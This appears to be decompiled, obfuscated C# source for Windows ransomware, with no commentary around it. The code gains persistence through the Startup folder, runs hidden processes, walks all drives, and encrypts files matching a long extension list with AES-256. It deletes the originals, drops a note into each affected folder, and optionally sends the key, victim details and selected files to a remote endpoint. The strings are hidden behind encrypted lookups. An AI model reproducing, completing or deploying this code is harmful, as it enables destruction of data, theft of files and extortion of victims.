using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using yEOBOUOgRZ;

namespace AFBGXefvzhgrS;

internal sealed class qXROyYvaHOl
{
	public sealed class KrQoEfrvvaR
	{
		private static StringCollection YVcFfJliChSy;

		private static List<string> VKLUopULOxjvh;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107391069));
			}
			catch (UnauthorizedAccessException ex)
			{
				YVcFfJliChSy.Add(ex.Message);
			}
			catch (DirectoryNotFoundException)
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107394379)) && !text.ToLower().Contains(getString_0(107393814)) && !text.ToLower().Contains(getString_0(107393833)) && !text.ToLower().Contains(getString_0(107393788)))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(AjUlaJnbfGYPSd) * 1024.0 * 1024.0 && eaTdrxGyeuJLy == getString_0(107396748))
							{
								VKLUopULOxjvh.Add(text);
							}
							else if (File.Exists(text) && eaTdrxGyeuJLy == getString_0(107396977))
							{
								VKLUopULOxjvh.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return VKLUopULOxjvh;
		}

		static KrQoEfrvvaR()
		{
			Strings.CreateGetStringDelegate(typeof(KrQoEfrvvaR));
			YVcFfJliChSy = new StringCollection();
			VKLUopULOxjvh = new List<string>();
		}
	}

	private sealed class AZnFDuWlYwyG
	{
		public string[] lmIEVHcPKcTb;

		public void _003CMain_003Eb__3()
		{
			QyQSpzVVucymSlm.AcTEzZKhqSQqpG(lmIEVHcPKcTb);
		}
	}

	private sealed class VDMfnjASnLZa
	{
		public string[] ShZJtorfbHUjEMB;

		public string[] JUajwHCWvsWaS;

		public string IXOldYJZXPu;

		public string EDxdaTFwDokyNZ;
	}

	private sealed class YEUsivDQsK
	{
		public VDMfnjASnLZa eEnsppounUALSSk;

		public string hFweJaThcoEby;

		public void _003CCrypt_003Eb__b()
		{
			mquSUTFklzKUfpWC(hFweJaThcoEby, eEnsppounUALSSk.ShZJtorfbHUjEMB, eEnsppounUALSSk.EDxdaTFwDokyNZ, eEnsppounUALSSk.JUajwHCWvsWaS, eEnsppounUALSSk.IXOldYJZXPu);
		}
	}

	public static string AGobLyEbdTWjT;

	public static byte[] YdOBqPoQZOQGd;

	public static string eaTdrxGyeuJLy;

	public static string AjUlaJnbfGYPSd;

	public static List<string> cEKZmafldvcccDb;

	public static List<string> ycAOZbOsrUsP;

	public static string VtHhqiuNwJJF;

	public static string PJWUBrAYYm;

	public static string VOpZMblklHv;

	public static int CkasgeVCwkTON;

	public static string fPtHXHfyGzkuF;

	public static string hlQuZEMxmr;

	public static string nXTkrHWnZFHT;

	public static string xBUAeLBriOMUnB;

	public static string zLSRcxMOtzkvn;

	public static string OVReYHSxlINjAUSB;

	public static string dzbSJUAaCIkPW;

	public static string FVwLRdveVu;

	public static List<string> vJjwdNLWdOiCo;

	public static List<string> hFcwSrfslFNfyoJi;

	public static string nvOZIFZqgxIFtB;

	public static string QMUtLSSAmeZsoRK;

	public static string YUZPUiZWRtONMd;

	public static List<string> sBVusSMatrECK;

	public static string HuWtKNEHsFbUk;

	private static string YpUcKIbwEcsUl;

	public static string dIKOpNyrfaGz;

	public static string VnTLvhZKcDFx;

	public static List<string> zoUOvPYiHBGGQ;

	public static List<string> UwftxHlYXTgnIxq;

	public static List<string> ddthXlvLuVsR;

	public static List<string> wNVsZEUwSgL;

	public static List<string> GfrTAMlTcOcnOh;

	public static string gotMhIdpngDF;

	internal static DateTime EziuyEruhM;

	public static string ohpwnUmSCqp;

	public static string UxibFdwLCDMZSM;

	public static string MrMyJKPGoE;

	public static string tbbCAEFAlco;

	public static string CjyRbGtWMMuVt;

	public static string JiwoZYbwFLWmR;

	public static string uPMgtMVyvzN;

	public static string odEoFMCAGxGsAo;

	public static List<string> pqvmTFTCLnFko;

	public static string PDKPoeOZbqWMdk;

	public static string kLuvYKPBSQxB;

	public static string LkZFNRvclAgE;

	public static string QKanKvBGQCUg;

	public static string wdCKKgqzngkyyoO;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			qdvzYOsnLlSMI.ejHlboRELnPMj(YpUcKIbwEcsUl);
		}
		catch (Exception)
		{
		}
		if (nXTkrHWnZFHT == getString_0(107396745))
		{
			Thread.Sleep(int.Parse(xBUAeLBriOMUnB));
		}
		if (LkZFNRvclAgE == getString_0(107396745))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					AZnFDuWlYwyG CS_0024_003C_003E8__locals0 = new AZnFDuWlYwyG();
					CS_0024_003C_003E8__locals0.lmIEVHcPKcTb = new string[3]
					{
						getString_0(107396740),
						getString_0(107396695),
						getString_0(107396706)
					};
					Thread thread = new Thread((ThreadStart)delegate
					{
						QyQSpzVVucymSlm.AcTEzZKhqSQqpG(CS_0024_003C_003E8__locals0.lmIEVHcPKcTb);
					});
					thread.IsBackground = true;
					thread.Start();
				}
			}
			catch
			{
			}
			try
			{
				glqsiAUHgEGqT.DLUCtpbaUh(EFlDOfEXsvOZ(getString_0(107396661)));
			}
			catch
			{
			}
			try
			{
				glqsiAUHgEGqT.DLUCtpbaUh(EFlDOfEXsvOZ(getString_0(107396676)));
			}
			catch
			{
			}
			try
			{
				glqsiAUHgEGqT.DLUCtpbaUh(EFlDOfEXsvOZ(getString_0(107397139)));
			}
			catch
			{
			}
			try
			{
				glqsiAUHgEGqT.DLUCtpbaUh(EFlDOfEXsvOZ(getString_0(107397154)));
			}
			catch
			{
			}
			Thread thread2 = new Thread(QyQSpzVVucymSlm.ddVZGGumtVLZ);
			thread2.IsBackground = true;
			thread2.Start();
		}
		if (JiwoZYbwFLWmR == getString_0(107396745) && uPMgtMVyvzN == getString_0(107396745))
		{
			try
			{
				yZnIrryXiD(getString_0(107397125));
			}
			catch
			{
			}
		}
		if (dzbSJUAaCIkPW == getString_0(107396745) && !PQtaWlHhgdOm.noYcNwLDngkWV())
		{
			PQtaWlHhgdOm.jJRFFknKplWC();
		}
		if (QMUtLSSAmeZsoRK == getString_0(107396745) && PQtaWlHhgdOm.noYcNwLDngkWV())
		{
			new CgsnuVvGNPsqm().OXQRoFdxvuLMp(bool_0: false);
			new CgsnuVvGNPsqm().OZZKZBqadwY();
		}
		if (hlQuZEMxmr == getString_0(107396745))
		{
			MCGcujGPOINCP.jGxLLzWOQM();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397016);
		string text2 = text + Path.GetFileName(fileName);
		if (VOpZMblklHv == getString_0(107396745) && fileName != text2)
		{
			Thread thread3 = new Thread(sQsvSqgRqEmxMcl);
			thread3.IsBackground = true;
			thread3.Priority = ThreadPriority.Highest;
			thread3.Start();
		}
		if (VtHhqiuNwJJF == getString_0(107396745) && mainModule != null && fileName != text2)
		{
			try
			{
				CkasgeVCwkTON = lvFyRPApvjfJnyb(0, vJjwdNLWdOiCo.Count);
				File.Copy(fileName, text + vJjwdNLWdOiCo[CkasgeVCwkTON], overwrite: true);
				Process.Start(text + vJjwdNLWdOiCo[CkasgeVCwkTON]);
				sCFuPayPEOtU();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		if (gotMhIdpngDF == getString_0(107396745) && DateTime.Now < EziuyEruhM)
		{
			return;
		}
		foreach (string item in zoUOvPYiHBGGQ)
		{
			gQxVlDcwnbXqeZ(getString_0(107397011), item);
		}
		foreach (string item2 in UwftxHlYXTgnIxq)
		{
			gQxVlDcwnbXqeZ(getString_0(107397030), item2);
		}
		foreach (string item3 in ddthXlvLuVsR)
		{
			gQxVlDcwnbXqeZ(getString_0(107396989), item3);
		}
		foreach (string item4 in wNVsZEUwSgL)
		{
			gQxVlDcwnbXqeZ(getString_0(107397004), item4);
		}
		foreach (string item5 in GfrTAMlTcOcnOh)
		{
			gQxVlDcwnbXqeZ(getString_0(107396955), item5);
		}
		upssHteNtrflT.nWcQqdntMAxsw();
		if (nvOZIFZqgxIFtB == getString_0(107396745))
		{
			IWDtRrDlLktWU.WTpeXVBBrCr();
		}
		if (VnTLvhZKcDFx == getString_0(107396745))
		{
			EJOCFXvcFJwyik.pNrEVVnfXvCQBP();
		}
		if (MrMyJKPGoE == getString_0(107396974))
		{
			PJWUBrAYYm = SlwxmNrhQyQ.zoyUCiejybU(32);
		}
		else
		{
			PJWUBrAYYm = getString_0(107396969);
		}
		string text3 = ivpkooXGhDz.rCMsAIZligvZUKh(PJWUBrAYYm);
		HOEscazOpJipInv(new string[1] { getString_0(107396380) }, new string[98]
		{
			getString_0(107396371),
			getString_0(107396398),
			getString_0(107396393),
			getString_0(107396352),
			getString_0(107396347),
			getString_0(107396342),
			getString_0(107396369),
			getString_0(107396364),
			getString_0(107396359),
			getString_0(107396354),
			getString_0(107396317),
			getString_0(107396312),
			getString_0(107396335),
			getString_0(107396330),
			getString_0(107396289),
			getString_0(107396284),
			getString_0(107396279),
			getString_0(107396274),
			getString_0(107396301),
			getString_0(107396330),
			getString_0(107396292),
			getString_0(107396255),
			getString_0(107396250),
			getString_0(107396245),
			getString_0(107396272),
			getString_0(107396267),
			getString_0(107396262),
			getString_0(107396225),
			getString_0(107396220),
			getString_0(107396215),
			getString_0(107396210),
			getString_0(107396237),
			getString_0(107396232),
			getString_0(107396227),
			getString_0(107396186),
			getString_0(107396181),
			getString_0(107396208),
			getString_0(107396203),
			getString_0(107396369),
			getString_0(107396198),
			getString_0(107396359),
			getString_0(107396157),
			getString_0(107396152),
			getString_0(107396147),
			getString_0(107396174),
			getString_0(107396169),
			getString_0(107396164),
			getString_0(107396639),
			getString_0(107396634),
			getString_0(107396629),
			getString_0(107396656),
			getString_0(107396651),
			getString_0(107396646),
			getString_0(107396609),
			getString_0(107396604),
			getString_0(107396599),
			getString_0(107396594),
			getString_0(107396621),
			getString_0(107396612),
			getString_0(107396575),
			getString_0(107396566),
			getString_0(107396585),
			getString_0(107396227),
			getString_0(107396198),
			getString_0(107396540),
			getString_0(107396531),
			getString_0(107396554),
			getString_0(107396513),
			getString_0(107396504),
			getString_0(107396527),
			getString_0(107396522),
			getString_0(107396481),
			getString_0(107396472),
			getString_0(107396495),
			getString_0(107396490),
			getString_0(107396485),
			getString_0(107396448),
			getString_0(107396443),
			getString_0(107396438),
			getString_0(107396465),
			getString_0(107396456),
			getString_0(107396451),
			getString_0(107396414),
			getString_0(107396409),
			getString_0(107396404),
			getString_0(107396431),
			getString_0(107396422),
			getString_0(107395869),
			getString_0(107395864),
			getString_0(107396232),
			getString_0(107395859),
			getString_0(107396186),
			getString_0(107395886),
			getString_0(107395881),
			getString_0(107395876),
			getString_0(107395839),
			getString_0(107395830),
			getString_0(107395857)
		}, new string[0], PJWUBrAYYm, getString_0(107395852));
		PJWUBrAYYm = SlwxmNrhQyQ.zoyUCiejybU(32);
		using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395807)))
		{
			streamWriter.WriteLine(EFlDOfEXsvOZ(getString_0(107395766)));
			streamWriter.WriteLine(EFlDOfEXsvOZ(getString_0(107395428)));
			streamWriter.WriteLine(getString_0(107394746));
			streamWriter.WriteLine(text3);
			streamWriter.WriteLine(getString_0(107394746));
			if (dIKOpNyrfaGz == getString_0(107396974))
			{
				streamWriter.WriteLine(EFlDOfEXsvOZ(getString_0(107395000)) + Convert.ToString(sBVusSMatrECK.Count));
			}
		}
		foreach (string item6 in hFcwSrfslFNfyoJi)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395807), item6 + getString_0(107395807), overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (HuWtKNEHsFbUk == getString_0(107396745))
		{
			try
			{
				if (dIKOpNyrfaGz == getString_0(107396974))
				{
					QBleGGpUEWf.YmrqNfgVQZRJBKN(getString_0(107394886), getString_0(107394321), getString_0(107394272), getString_0(107394287) + new WebClient().DownloadString(getString_0(107394238)) + getString_0(107394209) + default(DateTime).Date.ToString() + getString_0(107394212) + Convert.ToString(sBVusSMatrECK.Count) + getString_0(107394139) + Convert.ToString(sBVusSMatrECK) + getString_0(107394098) + text3);
				}
				else
				{
					QBleGGpUEWf.YmrqNfgVQZRJBKN(getString_0(107394886), getString_0(107394321), getString_0(107394272), getString_0(107394287) + new WebClient().DownloadString(getString_0(107394238)) + getString_0(107394209) + default(DateTime).Date.ToString() + getString_0(107394139) + Convert.ToString(sBVusSMatrECK) + getString_0(107394098) + text3);
				}
			}
			catch
			{
			}
		}
		if (FVwLRdveVu == getString_0(107396745))
		{
			try
			{
				wyEYLnpdbkri.ACRsOLkkdIoF(new Uri(getString_0(107394597)));
			}
			catch
			{
			}
		}
		Process.Start(getString_0(107394496), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395807));
		if (AGobLyEbdTWjT == getString_0(107394511))
		{
			sCFuPayPEOtU();
		}
	}

	public static void sQsvSqgRqEmxMcl()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(getString_0(107394502), getString_0(107394357), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int lvFyRPApvjfJnyb(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> MqXrfVAvBxCr(string string_0)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(string_0))
		{
			throw new ArgumentException();
		}
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107394376)) && !text.ToLower().Contains(getString_0(107393811)) && !text.ToLower().Contains(getString_0(107393830)) && !text.ToLower().Contains(getString_0(107393785)))
				{
					array = Directory.GetFiles(text);
					goto IL_00e4;
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00e4:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(AjUlaJnbfGYPSd) * 1024.0 * 1024.0 && eaTdrxGyeuJLy == getString_0(107396745))
					{
						list.Add(fileInfo.FullName);
					}
					else if (File.Exists(fileInfo.FullName) && eaTdrxGyeuJLy == getString_0(107396974))
					{
						list.Add(fileInfo.FullName);
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string gQxVlDcwnbXqeZ(string BZKRtQtCBqm = "", string UzsZlKLMIeeAQ = "")
	{
		string result = getString_0(107393760);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = BZKRtQtCBqm,
				Arguments = UzsZlKLMIeeAQ,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void yZnIrryXiD(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393759),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string EFlDOfEXsvOZ(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void sCFuPayPEOtU()
	{
		string text = EFlDOfEXsvOZ(getString_0(107393774));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107393709) + text + getString_0(107393709) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107393704);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void HOEscazOpJipInv(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		VDMfnjASnLZa vDMfnjASnLZa = new VDMfnjASnLZa();
		vDMfnjASnLZa.ShZJtorfbHUjEMB = string_1;
		vDMfnjASnLZa.JUajwHCWvsWaS = string_2;
		vDMfnjASnLZa.IXOldYJZXPu = string_3;
		vDMfnjASnLZa.EDxdaTFwDokyNZ = string_4;
		YdOBqPoQZOQGd = Encoding.ASCII.GetBytes(vDMfnjASnLZa.IXOldYJZXPu);
		if (string_0[0] == getString_0(107396380))
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady)
					{
						cEKZmafldvcccDb.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				cEKZmafldvcccDb.Add(string_0[j]);
			}
		}
		using List<string>.Enumerator enumerator = cEKZmafldvcccDb.GetEnumerator();
		while (enumerator.MoveNext())
		{
			YEUsivDQsK CS_0024_003C_003E8__locals0 = new YEUsivDQsK();
			CS_0024_003C_003E8__locals0.eEnsppounUALSSk = vDMfnjASnLZa;
			CS_0024_003C_003E8__locals0.hFweJaThcoEby = enumerator.Current;
			if (dIKOpNyrfaGz == getString_0(107396745))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					mquSUTFklzKUfpWC(CS_0024_003C_003E8__locals0.hFweJaThcoEby, CS_0024_003C_003E8__locals0.eEnsppounUALSSk.ShZJtorfbHUjEMB, CS_0024_003C_003E8__locals0.eEnsppounUALSSk.EDxdaTFwDokyNZ, CS_0024_003C_003E8__locals0.eEnsppounUALSSk.JUajwHCWvsWaS, CS_0024_003C_003E8__locals0.eEnsppounUALSSk.IXOldYJZXPu);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				mquSUTFklzKUfpWC(CS_0024_003C_003E8__locals0.hFweJaThcoEby, vDMfnjASnLZa.ShZJtorfbHUjEMB, vDMfnjASnLZa.EDxdaTFwDokyNZ, vDMfnjASnLZa.JUajwHCWvsWaS, vDMfnjASnLZa.IXOldYJZXPu);
			}
		}
	}

	public static void mquSUTFklzKUfpWC(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		if (!Directory.Exists(string_0))
		{
			return;
		}
		List<string> list = new List<string>();
		list = ((!(QKanKvBGQCUg == getString_0(107396745))) ? KrQoEfrvvaR.SearchFiles(string_0) : MqXrfVAvBxCr(string_0));
		foreach (string value in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value2 = string_3[num];
						if (!item.EndsWith(value2))
						{
							num++;
							continue;
						}
						goto IL_0394;
					}
				}
				if (!item.EndsWith(value) || item.Contains(getString_0(107393659)) || item.Contains(getString_0(107393626)) || item.Contains(getString_0(107393601)) || item.ToLower().Contains(getString_0(107394376)) || item.ToLower().Contains(getString_0(107393811)) || item.ToLower().Contains(getString_0(107393785)) || sBVusSMatrECK.Contains(item))
				{
					continue;
				}
				if (fPtHXHfyGzkuF == getString_0(107396745))
				{
					try
					{
						if (CfpMeqrrKiGn.JNZlPLlZXmP(item))
						{
							CfpMeqrrKiGn.HEFsyRttHP(item);
						}
					}
					catch
					{
					}
				}
				sBVusSMatrECK.Add(item);
				if (!hFcwSrfslFNfyoJi.Contains(Path.GetDirectoryName(item)))
				{
					hFcwSrfslFNfyoJi.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ohpwnUmSCqp == getString_0(107396745) && fileStream.Length > Convert.ToInt32(UxibFdwLCDMZSM) * 1024 * 1024)
					{
						if (odEoFMCAGxGsAo == getString_0(107396745))
						{
							foreach (string item2 in pqvmTFTCLnFko)
							{
								if (item.EndsWith(item2) && PDKPoeOZbqWMdk == getString_0(107396745) && Convert.ToInt32(kLuvYKPBSQxB) * 1024 * 1024 > fileStream.Length)
								{
									try
									{
										QBleGGpUEWf.ToxwHOenSO(getString_0(107394886), getString_0(107394321), getString_0(107393588), item);
									}
									catch
									{
									}
								}
							}
						}
						byte[] byte_ = fvCBvmavswY.HomJuSKPcKbOadF(item, Convert.ToInt32(UxibFdwLCDMZSM) * 1024 * 1024);
						byte[] byte_2 = fvCBvmavswY.LQOupGFMSQdUDQ(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						fvCBvmavswY.TnEEoodVmOJqw(item, byte_2);
						if (string_2 != getString_0(107393611))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107393611))
					{
						wQDKEmIcSEnOO(item, item + string_2, YdOBqPoQZOQGd);
					}
					else
					{
						wQDKEmIcSEnOO(item, item + getString_0(107393606), YdOBqPoQZOQGd);
					}
				}
				catch (Exception)
				{
				}
				IL_0394:;
			}
		}
	}

	private static void wQDKEmIcSEnOO(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (odEoFMCAGxGsAo == getString_0(107396745))
					{
						foreach (string item in pqvmTFTCLnFko)
						{
							if (string_0.EndsWith(item) && PDKPoeOZbqWMdk == getString_0(107396745) && Convert.ToInt32(kLuvYKPBSQxB) * 1024 * 1024 > fileStream3.Length)
							{
								try
								{
									QBleGGpUEWf.ToxwHOenSO(getString_0(107394886), getString_0(107394321), getString_0(107393588), string_0);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107393606)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107393606), getString_0(107393760)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	static qXROyYvaHOl()
	{
		Strings.CreateGetStringDelegate(typeof(qXROyYvaHOl));
		AGobLyEbdTWjT = getString_0(107394511);
		YdOBqPoQZOQGd = null;
		eaTdrxGyeuJLy = getString_0(107396974);
		AjUlaJnbfGYPSd = getString_0(107394077);
		cEKZmafldvcccDb = new List<string>();
		ycAOZbOsrUsP = new List<string>();
		VtHhqiuNwJJF = getString_0(107396974);
		PJWUBrAYYm = getString_0(107393760);
		VOpZMblklHv = getString_0(107396974);
		CkasgeVCwkTON = 0;
		fPtHXHfyGzkuF = getString_0(107396974);
		hlQuZEMxmr = getString_0(107396974);
		nXTkrHWnZFHT = getString_0(107396974);
		xBUAeLBriOMUnB = getString_0(107394096);
		zLSRcxMOtzkvn = getString_0(107396974);
		OVReYHSxlINjAUSB = getString_0(107396974);
		dzbSJUAaCIkPW = getString_0(107396974);
		FVwLRdveVu = getString_0(107396974);
		vJjwdNLWdOiCo = new List<string>
		{
			getString_0(107394091),
			getString_0(107394046),
			getString_0(107394061),
			getString_0(107394016),
			getString_0(107394031),
			getString_0(107393982),
			getString_0(107394001),
			getString_0(107393952),
			getString_0(107393967),
			getString_0(107393918),
			getString_0(107393937),
			getString_0(107393888),
			getString_0(107393903)
		};
		hFcwSrfslFNfyoJi = new List<string>();
		nvOZIFZqgxIFtB = getString_0(107396745);
		QMUtLSSAmeZsoRK = getString_0(107396974);
		YUZPUiZWRtONMd = getString_0(107396974);
		sBVusSMatrECK = new List<string>();
		HuWtKNEHsFbUk = getString_0(107396974);
		YpUcKIbwEcsUl = getString_0(107393854);
		dIKOpNyrfaGz = getString_0(107396745);
		VnTLvhZKcDFx = getString_0(107396745);
		zoUOvPYiHBGGQ = new List<string>
		{
			getString_0(107393325),
			getString_0(107393272),
			getString_0(107393263),
			getString_0(107393210),
			getString_0(107393177)
		};
		UwftxHlYXTgnIxq = new List<string>
		{
			getString_0(107393160),
			getString_0(107393079),
			getString_0(107393534),
			getString_0(107393521)
		};
		ddthXlvLuVsR = new List<string>
		{
			getString_0(107393480),
			getString_0(107393455),
			getString_0(107393422)
		};
		wNVsZEUwSgL = new List<string>
		{
			getString_0(107393385),
			getString_0(107393348),
			getString_0(107392735),
			getString_0(107392662),
			getString_0(107392625),
			getString_0(107393064),
			getString_0(107392995),
			getString_0(107392890),
			getString_0(107392821),
			getString_0(107392268),
			getString_0(107392199),
			getString_0(107392094),
			getString_0(107392537),
			getString_0(107393385)
		};
		GfrTAMlTcOcnOh = new List<string>
		{
			getString_0(107392496),
			getString_0(107392318),
			getString_0(107391692),
			getString_0(107392026),
			getString_0(107391912),
			getString_0(107391222)
		};
		gotMhIdpngDF = getString_0(107396974);
		EziuyEruhM = new DateTime(2000, 1, 1);
		ohpwnUmSCqp = getString_0(107396745);
		UxibFdwLCDMZSM = getString_0(107391108);
		MrMyJKPGoE = getString_0(107396974);
		tbbCAEFAlco = getString_0(107396974);
		CjyRbGtWMMuVt = getString_0(107396974);
		JiwoZYbwFLWmR = getString_0(107396745);
		uPMgtMVyvzN = getString_0(107396974);
		odEoFMCAGxGsAo = getString_0(107396974);
		pqvmTFTCLnFko = new List<string>
		{
			getString_0(107396301),
			getString_0(107396527),
			getString_0(107396330),
			getString_0(107395864)
		};
		PDKPoeOZbqWMdk = getString_0(107396974);
		kLuvYKPBSQxB = getString_0(107391071);
		LkZFNRvclAgE = getString_0(107396745);
		QKanKvBGQCUg = getString_0(107396974);
		wdCKKgqzngkyyoO = getString_0(107396974);
	}
}
